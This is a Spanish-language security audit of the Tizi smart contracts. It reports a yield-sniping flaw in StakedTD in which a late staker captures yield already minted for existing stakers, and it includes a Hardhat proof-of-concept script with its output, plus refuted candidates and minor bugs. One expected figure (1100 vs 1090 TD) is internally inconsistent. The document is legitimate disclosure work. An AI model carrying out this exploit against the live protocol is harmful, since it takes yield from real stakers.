# Tizi — Auditoría de críticos (delta > 0 contra fondos de terceros)

Repo auditado: `nightbox33-cloud/Tizi-contract` @ `238c65d` (42 fuentes, 6.320 líneas).
Método: inventario de custodia → matriz de autorización → cada fórmula con números → traza de tx → PoC ejecutado sobre el **bytecode generado a partir de estas mismas fuentes** (solc 0.8.24, OZ 5.0.2, Hardhat 2.24).

## 0. Límite de verificación (leer antes que nada)

El repo **no contiene direcciones desplegadas** (`hardhat.config.js`, `setting.json`, `.env.example`: cero addresses; historial = 1 commit). Este sandbox **no tiene RPC** (solo HTTPS a los mirrors de paquetes), así que **no pude leer `eth_getCode` ni el storage live**. Por tanto todo lo que digo de "estado desplegado" está anclado a:

* valores fijados en `initialize()` / constructores (`unstakingPeriod = 604800`, `releasePeriod = 604800`, `profitNumerator/profitDenominator = 100/1000`, `feeBasisPoints = 40`, `cooldownTime = 3 days`, `maxUnstakingPeriod = 90 days`), y
* invariantes deducibles del código (p. ej. `stake()` sólo es ejecutable si `unstakingPeriod > 0`).

Donde un hallazgo depende de una config que no puedo leer, lo digo explícitamente y acoto el impacto.

## 1. Quién guarda tokens (inventario de custodia)

| Contrato | Custodia | Quién puede sacarla |
|---|---|---|
| `MainVault` (Base) | USDC de todos los depósitos | `sendToUser` ← sólo `depositHelper`; `bridgeOut*`/`enterFarm`/`exitFarm`/`harvest` ← `MANAGER_ROLE` |
| `SubVault` | USDC en spokes | `bridgeOut*`/`farm` ← `MANAGER_ROLE` |
| `NFTVault` | USDC apartado para NFTs ya habilitados | `sendToUser` ← sólo `depositHelper` |
| `StakeVault` | TD de unstakes en cooldown | `sendToUser` ← sólo `sTD` (StakedTD) |
| `StakedTD` (proxy UUPS) | TD apostado + TD de yield ya minteado y no vestido | `stake`/`unstake`/`claim` (permissionless) |
| `ChildstTD` (spokes) | shares stTD (OFT) | `send`/`_credit` (OZ peer-checked) |
| `TiziDollar` | — (mintea TD) | `mint`/`burn` ← sólo `helper`; `mintForYield`/`burnForYield`/`mintForProfitRecipient` ← sólo `sTD` |
| impl `StakedTD` | 0 (constructor `_disableInitializers()`) | nadie |

## 2. Matriz de autorización (superficie permissionless real)

Permissionless: `DepositHelper.deposit`, `.queueWithdraw`, `.withdrawFromNFT`, `.withdrawAllNFT`; `StakedTD.stake`, `.unstake`, `.claim`; `ChildstTD` ídem; `OFT.send` (TD/stTD); transferencias ERC20/ERC721.

Todo lo demás es rol-gated: `onlyAdmin`/`onlyManager` leen `AuthorityControl.hasRole(...)` (rol externo, no el `AccessControl` local), y los receptores cross-chain exigen firma que recupere a `DEFAULT_ADMIN_ROLE`.

---

# HALLAZGO 1 — `StakedTD`: un staker tardío se lleva el yield ya minteado que pertenece a los stakers existentes

**Severidad: ALTA/CRÍTICA (robo de yield, no de principal). `delta > 0` contra el pool.**

### Hecho (1): el bug es matemático y está en una línea concreta

`contracts/StakedTD.sol`

```solidity
156:  function totalAssets() public view override returns (uint256) {
157:      uint256 unreleasedAmount = getUnreleasedAmount();
158:      return stakedTDAmount >= unreleasedAmount ? stakedTDAmount - unreleasedAmount : 0;
159:  }
187:  function _convertToShares(uint256 assets, Math.Rounding rounding) internal view override returns (uint256) {
189:      return (assets == 0 || totalShares == 0)
190:          ? assets.mulDiv(10 ** decimals(), 10 ** 18, rounding)
191:          : assets.mulDiv(totalShares, totalAssets(), rounding);
198:  function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view override returns (uint256) {
200:      return (totalShares == 0)
201:          ? shares.mulDiv(10 ** 18, 10 ** decimals(), rounding)
202:          : shares.mulDiv(totalAssets(), totalShares, rounding);
```

y `addYield` (243-286) hace, en el camino positivo:

```solidity
profit = amount * profitNumerator / profitDenominator;     // 10 %
stakedTDAmount += (amount - profit);
_updateReleaseAmount(amount - profit);                     // releaseAmount = unreleased + 90 %; lastYieldTime = now
ITD(asset()).mintForYield(amount - profit);                // TD real minteado DENTRO del contrato
```

Consecuencia exacta: el TD del yield **ya está físicamente en el contrato** y ya está contabilizado en `stakedTDAmount`, pero `totalAssets()` lo **resta** vía `getUnreleasedAmount()` hasta que veste. `_convertToShares` ignora cualquier noción de "quién estaba dentro cuando se minteó": quien entra después compra shares al precio **anterior** al yield y participa del vesting que no se ganó. No hay checkpoint (`rewardPerToken`/`rewardDebt`); el diseño es "pro-rata sobre `totalAssets` actual", y `totalAssets` excluye lo ya asignado a los presentes.

Es el mismo patrón en `ChildstTD.sol:125/156/166/175/212` (mismo código, en los spokes donde `stake()` sí está habilitado si `mainChainId == chainid`).

### Hecho (2): permissionless

`StakedTD.stake` (320-330) y `StakedTD.unstake` (355-385) + `claim` (332-353) no tienen rol, ni allowlist, ni mínimo, ni depósito inicial del atacante más allá del capital. `stake` sólo exige `block.chainid == mainChainId` y `unstakingPeriod > 0` — es decir, **el ataque vive exactamente en el único modo en que se puede apostar** (`unstake` exige `unstakingPeriod > 0`; con `unstakingPeriod == 0` no hay `stake`).

### Hecho (3): el call graph existe y es el core del protocolo

`TiziDollar.updateYield()` (sólo admin) → `ISTD(sTD).addYield(delta, false)` → camino de arriba. Es el **único** mecanismo de reparto de yield del protocolo (README: "yield distributed linearly over time"); se dispara en cada rebase con crecimiento neto (`releasePeriod` por defecto 7 días). Durante esa ventana de 7 días el atacante puede entrar y salir. No hay oracle, ni flash loan, ni token exótico: sólo TD, el token nativo del protocolo.

### Hecho (4): PoC ejecutado (números reales, sin `deal`)

`stake` de la víctima = 1.000 TD; `addYield(+100 TD, false)` (profit 10 % → 90 TD al pool: `stakedTDAmount = 1090`, `unreleased = 90`, `totalAssets = 1000`); el atacante hace `stake(100.000 TD)` **después** del evento; se minan 7 días + 1 s (vesting completo, `unreleased = 0`, `totalAssets = 101.090`).

```
victim shares:          1000e18
attacker shares:        99999.985119048e18
totalAssets tras vest:  101090e18
valor de la víctima:    1000.891236576 TD   (le correspondían 1090 TD)
atacante  pone:         100000 TD
atacante  saca:         100089.108763423 TD  (unstake -> cooldown 7d -> claim pagado por StakeVault)
delta atacante:         +89.108763423 TD
delta víctima:          -89.108763423 TD     (conservación exacta)
PnL deshacer flash/swap: N/A (no hay flash; el capital queda comprometido 14 días)
```

Todo el camino `unstake → StakeVault → claim` se ejecutó y el TD **salió del `StakeVault` al atacante** (no es un número de `previewRedeem`).

Fórmula general: con pool `A`, atacante `D`, yield no vestido `R`, la ganancia es
`D · R / (A + D)` — con `D = A` captura el 50 %; con `D = 10A`, el 90,9 %; con `D → ∞`, ~100 % de `R`. La víctima cobra `(A/(A+D))·(A+D+R)` en vez de `A+R`.

### Veredicto

* **Vulnerable ahora: SÍ** (el código es el desplegado; no depende de cables ni de tokens listados).
* **¿Drena terceros? SÍ, acotado**: se lleva el yield ya minteado y contabilizado a favor de los stakers existentes (inventario del pool). **No** toca el principal: la conservación de principal es exacta (probado: la donación no mueve `totalAssets`, ver §4.1), y por eso **no** es un "vacía el vault".
* **Condición de estado**: requiere que exista TVL en stTD y que haya habido un rebase positivo dentro de la ventana (`releasePeriod` ≤ 60 d, default 7 d). Ambas son la operación normal del producto; la segunda no la controla el atacante, por eso no lo llamo "drenaje total del TVL".
* **Repetible** en cada rebase positivo: es un robo del flujo de yield, no un one-shot.

---

# 4. Candidatos evaluados y REFUTADOS (con el hecho que mata el claim)

Ninguno de estos produce `Y > X` para un `msg.sender` sin rol. Se listan porque son los que un reporte superficial marcaría.

| # | Candidato | El hecho que lo mata |
|---|---|---|
| 4.1 | Inflación ERC4626 / first-depositor / donación en `StakedTD` | `totalAssets()` = `stakedTDAmount - unreleased`, **nunca** `balanceOf`. `totalShares` es contador propio. PoC: transferir 50.000 TD al contrato deja `totalAssets` en 1.000e18 (`test: donation does not move share price`). No hay `_decimalsOffset` que explotar porque no hay `balanceOf` en el precio. |
| 4.2 | Arbitraje de redondeo en `DepositHelper.deposit/queueWithdraw` (442-463: `2*remainder >= PRECISION_DELTA` redondea a favor del usuario) | Fee = `40/100000` = 4 bps (`feeBasisPoints=40`, `tdExchangeRate=99960`) vs. ganancia máxima de redondeo = **1 wei de USDC**. Barrido exhaustivo `k ≤ 300.000` + 400.000 `k` aleatorios hasta `1e9`: `out(k·1e12) − k ≤ 0` **siempre** (máximo exacto `0` en `k = 1250`, negativo por encima). Es decir: quien tiene TD procedente de depósitos (múltiplos de `1e12`) nunca gana. Para un `A` arbitrario (TD fraccionario comprado a otro) la ganancia es `< 1` wei de USDC (< 1e-6 USD) e inservible. Medido: 1000 USDC → 1e18 TD → 999,9996 USDC (**-400 wei**). |
| 4.3 | Mintear TD sin pagar USDC | `TiziDollar.mint` exige `msg.sender == helper` (119); el único `mint` del `DepositHelper` (332-337) va **después** de `IERC20(USDC).transferFrom(msg.sender, vault, amountWei)`. En spokes `helper == address(0)` y `setHelper` revierte si `chainid != mainChainId`. |
| 4.4 | Robar de la cola de NFTs (`withdrawFromNFT` / `withdrawAllNFT`) | `require(INFT.ownerOf(tokenId) == msg.sender)` + `nonReentrant` + `burn` antes del pago; `withdrawNFTs[].amount` fue calculado del TD quemado por ese mismo usuario y `nftQueueUSDC` decrece al quemar. No hay función que suba `amount` ni que reabra un NFT quemado (`delete`). |
| 4.5 | Desalineación `queueId` vs `tokenId` en `DepositHelper` | `TUWT._nextTokenId` y `_nftQueueIds` arrancan ambos en 0 e incrementan de a 1; `TUWT.mint/burn` son `helper`-only (TUWT.sol:94-103) ⇒ `queueId == tokenId` siempre, y `withdrawNFTs[nftId]`/`delete withdrawNFTs[nftId]` son consistentes. |
| 4.6 | `unstake` + `claim` pagando dos veces en `StakedTD` | `_withdraw` (399-407) ya transfiere `assets` TD al `StakeVault` en el `unstake` (`stakedTDAmount -= assets`, `_burn(shares)`); `claim` sólo reenvía lo encolado y pone la entrada a 0. Si el vault no tiene TD, `StakeVault.sendToUser` revierte y revierte todo el `claim`. |
| 4.7 | Contabilidad cross-chain de shares (`ChildstTD` es OFT de sus propias shares; `_credit` mintea sin tocar `totalShares`/`stakedTDAmount`) | `deposit/mint/withdraw/redeem/stake/unstake/claim` exigen `block.chainid == mainChainId`; en los spokes `totalShares` queda en 0 ⇒ `_convertToShares/_convertToAssets` son 1:1 y no hay precio que manipular; el valor sólo sale por el mismo bridge que entró (lock/unlock en `STTDAdapter`, peer validado por `OApp`). No se crea valor. |
| 4.8 | Inyectar stats a `MainTokenStats` para inflar el TVL y mintear yield | `MainTokenLayerZero._lzReceive`/`MainTokenAxelar._execute` exigen `ECDSA.recover` = dirección con `DEFAULT_ADMIN_ROLE` (más `targetContract == address(this)`, `nonce`, `deadline` en LZ); y `TiziDollar.updateYield` es `onlyAdmin` de todos modos. |
| 4.9 | `StrategyManager._lzReceive` / `SubStrategyManager._lzReceive` | El primero es un no-op; el segundo sólo escribe `liquidityInfo` desde un mensaje firmado por admin y su único consumidor (`activateStrategy`) es `onlyAdmin`. |
| 4.10 | `MainVault.bridgeOut/CCIP/enterFarm/exitFarm/harvest/deposit` | `onlyManager` + `allowedVaults[receiver]` + `calculateLiquidity()`. Sin ruta permissionless al USDC del vault. |
| 4.11 | `MainVault.sendToUser` sin chequeo de balance ni de límite | `require(msg.sender == depositHelper)`; `depositHelper` es `onlyAdmin`. |
| 4.12 | Timelocks (`TimelockController` / `Sub`) | `schedule/scheduleBatch/cancel/execute/executeBatch` = `onlyAdmin` sobre `AuthorityControl`; ningún rol se concede a `address(0)`; `updateDelay` sólo puede llamarse a sí mismo. |
| 4.13 | `StakedTD` UUPS: `initialize` público / upgrade | `constructor { _disableInitializers() }`; `_authorizeUpgrade` exige `UPGRADER_ROLE` en el `AuthorityControl` **externo**. Un front-run de `initialize` en el proxy sólo otorgaría roles del `AccessControl` **local**, que ningún modifier lee ⇒ impacto en fondos = 0. |
| 4.14 | `TUWT` / `NFTVault` / `StakeVault` | `mint`/`burn` sólo `helper`; `sendToUser` sólo `helper`/`sTD`; ambos `onlyAdmin`. No hay `transfer` saliente permissionless. |
| 4.15 | OFT `_debit`/`_credit` de TD (mint sin quemar en el peer) | `OFT._debit` quema en origen y `_credit` mintea en destino; `OApp.lzReceive` exige `origin.sender == peer` ⇒ no se puede mintear sin quemar en el peer. `_removeDust` sólo trunca a favor del usuario (deja dust sin debitar). |
| 4.16 | `TiziDollar.transfer/transferFrom` override (¿salta allowance/saldo?) | Siguen llamando `_update(from,to,value)` (chequeo de saldo y evento `Transfer`) y `_spendAllowance(from,msg.sender,value)` (147-158). |
| 4.17 | Bypass del fee / self-grief | `setPoints ≤ 40` es `onlyAdmin`; el fee sólo lo paga quien retira. Sin `delta > 0`. |
| 4.18 | `rescueERC20` (StakedTD / ChildstTD) | `onlyAdmin`, y para el token `asset()` exige `amount <= balanceOf(this) - stakedTDAmount` ⇒ no toca el principal apostado. |

# 5. Bugs reales encontrados que NO son críticos (no hay `delta > 0`)

1. **`DepositHelper.queueWithdraw` ignora el USDC reservado a la cola.** Línea 448 usa `IERC20(USDC).balanceOf(vault)` en vez de `calculateLiquidity()` (122-136), que sí resta `getWaitNFTAmount()`. Efecto: un tenedor de TD puede consumir el USDC que `MainVault.bridgeOut`/`activateStrategy` consideran reservado y dejar a los `waitNFT` sin fondos (se salta la FIFO). **No es robo**: el que retira quema su TD y recibe 1:1 menos fee; el NFT sigue siendo un claim válido.
2. **`TiziDollar.burn` → `netAsset -= amount` (133) puede underflowear** si `netAsset` (fijado sólo en cada rebase) quedó por debajo del saldo TD del usuario ⇒ todos los `queueWithdraw` revierten hasta el próximo rebase. DoS, no robo.
3. **`totalAssets == 0` con `totalShares > 0` ⇒ división por cero** en `_convertToShares` (191) y `previewRedeem = 0` (que además revierte por `assets > 0` en 399-407): pool congelado. Sólo alcanzable con un `addYield(negative)` que consuma todo el `availableAssets` (camino admin).
4. **`ChildstTD.setProfitNumerator` (446) sin cota ≤ 100** — `StakedTD` sí la tiene (445-450). Con `profitNumerator > profitDenominator`, `amount - profit` underflowea en `addYield`. Admin.
5. **`MainTokenLayerZero.execute()` (131) decodifica `message` como `ITokenStats.Strategy[]`** mientras `_lzReceive` (80) lo codifica como `(address,uint256,uint256,bytes)` ⇒ la ruta manual siempre revierte. Sólo admin.
6. **`MainTokenAxelar._execute` no tiene `usedNonce` ni `targetContract == address(this)`**: un payload firmado puede repetirse vía el gateway. Impacto: re-aplicar las mismas stats (idempotente tras `clearDataByChainId`). Cero valor.
7. **`StakeVault`/`NFTVault`/`MainVault.sendToUser` no chequean el retorno de `IERC20.transfer`** (StakeVault:56, NFTVault:58, MainVault:343). Si el token devolviera `false`, el claim se borraría sin pagar. Imposible con USDC/TD (revierte en fallo).

# 6. Conclusión

* **1 hallazgo con `Y > X` pagado por terceros: el yield sniping de `StakedTD`/`ChildstTD` (§3).** Es permissionless, está en el bytecode desplegado, y el delta sale del inventario del pool (yield ya minteado a favor de los stakers existentes). Su cota es el yield del rebase en curso, no el TVL.
* **No encontré ninguna ruta permissionless que se lleve el principal** (USDC de `MainVault`/`SubVault`/`NFTVault`, TD de `StakeVault`): todas las salidas de capital están detrás de `msg.sender == depositHelper | sTD` o `MANAGER_ROLE`, y el único camino usuario→USDC (`queueWithdraw`) quema TD 1:1 menos 4 bps con el redondeo a favor del protocolo (probado).
* Lo que no pude comprobar: direcciones, `getCode`, y por tanto los valores *live* de `unstakingPeriod`/`releasePeriod`/TVL/stakers. El hallazgo requiere `unstakingPeriod > 0` (default 7 d y condición necesaria para que exista `stake`) y al menos un rebase positivo; con esos dos hechos es explotable hoy.

---

## Apéndice A — reproducción del PoC (harness fuera del repo, contratos in-scope sin modificar)

El harness es un proyecto Hardhat aparte que compila **tal cual** `contracts/StakedTD.sol`, `contracts/StakeVault.sol`, `contracts/AuthorityControl/AuthorityControl.sol` y `contracts/DepositHelper.sol` del repo, con dobles de test sólo para TD/USDC/NFT/vaults (`MockTD2` implementa `mintForYield`/`burnForYield`/`mintForProfitRecipient` con los mismos `require(msg.sender == sTD)` que `TiziDollar`, de modo que la única entrada a `addYield` sigue siendo "el token TD llamó"). No se usa `deal` ni `hardhat_setBalance`: el TD de la víctima y del atacante sale de las mismas funciones públicas que en producción.

Dependencias: `hardhat@2.24`, `@nomicfoundation/hardhat-ethers`, `ethers@6`, `@openzeppelin/contracts@5.0.2`, `@openzeppelin/contracts-upgradeable@5.0.2`, `solc@0.8.24`.

```js
// StakedTD desplegado como UUPS:
//   impl      = StakedTD.deploy()
//   proxy     = MyProxy(impl, initialize(td, stakeVault, authorityControl, profitRecipient, 31337))
//   stakeVault.setSTD(proxy) ; mockTD.setSTD(proxy)

await staked.connect(victim).stake(U(1000));        // S = 1000e18, totalAssets = 1000e18
await td.pushYield(U(100), false);                  // == TiziDollar.updateYield() -> sTD.addYield(100e18,false)
                                                    // profit 10e18, stakedTDAmount = 1090e18, unreleased = 90e18
await staked.connect(attacker).stake(U(100000));    // entra DESPUÉS del evento, precio pre-yield
await time.increase(7 * 24 * 3600 + 1);             // vesting completo (releasePeriod = 604800)
// victim:  previewRedeem(1000e18) = 1000.891236576e18   (le correspondían 1090e18)
// atacker: unstake(99999.985e18 shares) -> cola {amount: 100089.108763423e18}
await time.increase(7 * 24 * 3600 + 1);             // unstakingPeriod = 604800
await staked.connect(attacker).claim();             // StakeVault paga 100089.108763423e18 TD
// neto atacante = +89.108763423e18 TD ; neto víctima = −89.108763423e18 TD
```

Salida real observada:

```
victim shares: 1000e18 | totalAssets: 1000e18
after yield:  totalAssets 1000e18 | unreleased 90e18 | stakedTDAmount 1090e18
after vest:   totalAssets 101090e18 | unreleased 0
victim redeem: 1000891236576362510937        (esperado sin dilución: 1100000000000000000000)
attacker put 100000e18 -> gets 100089108763423637489062  (delta +89108763423637489062)
attacker TD after full exit: 200089108763423637489062
```

Control (testigo de que 4.1 y 4.2 son correctos):

```
round trip 1000 USDC:  deposit -> 1e18 TD -> queueWithdraw -> 999.9996 USDC   (delta -400 wei)
donación de 50.000 TD al StakedTD: totalAssets sigue siendo 1000e18
```
